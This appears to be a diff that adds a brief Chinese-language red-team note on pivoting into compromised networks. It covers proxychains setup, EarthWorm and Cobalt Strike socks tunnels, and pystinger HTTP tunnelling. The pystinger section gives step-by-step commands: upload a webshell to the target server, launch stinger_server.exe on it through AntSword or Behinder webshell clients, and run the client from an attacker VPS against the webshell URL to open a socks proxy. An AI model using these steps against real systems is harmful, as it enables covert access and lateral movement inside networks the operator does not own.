@@ -1,0 +1,46 @@
+
+正向连接推荐：
+代理工具：
+1. proxychains：tcp连接，不支持udp、icmp等协议。支持tor、http、socks代理。  只会将当前应用的tcp连接转发至代理，而非全局代理。
+配置：
+vim /etc/proxychains4.conf
+后面添加如：
+socks4 192.168.43.6 58
+或
+socks5 192.168.43.6 58
+
+常见问题：
+1.代理后nmap无法使用，报错"rc==0" failed：
+A：
+注释掉/etc/proxychains4.conf中的proxy_dns即可，即dns请求不走代理。
+
+icmp协议属于网络层。
+
+2. proxifier
+
+
+
+隧道工具：
+1. socks隧道：
+a1：earthworm
+a2：cs自带socks
+
+2. http、https隧道：pystinger反代的cs会话容易假死，重新运行一下paylaod即可。
+pystinger：https://github.com/FunnyWolf/pystinger
+-------------1s------------
+上传对应的webshell到目标服务器。
+
+访问对应的文件：
+http://falsespace1.com/htdocs/admin/api/whdz/q1/proxy.php
+若返回UTF-8则表示访问成功。
+
+将对应的stinger_server.exe文件上传至目标服务器。
+蚁剑/冰蝎执行start C:/phpStudy/WWW/htdocs/admin/api/whdz/q1/stinger_server.exe命令启动服务端(最好使用完整路径)。
+
+vps客户端执行：
+./stinger_client -w http://falsespace1.com/htdocs/admin/api/whdz/q1/proxy.php -l 127.0.0.1 -p 50001
+
+若出现Socks4a ready to accept则表示连接成功。
+直接通过socks4协议连接本机的50001端口即可(http隧道)。
+
+
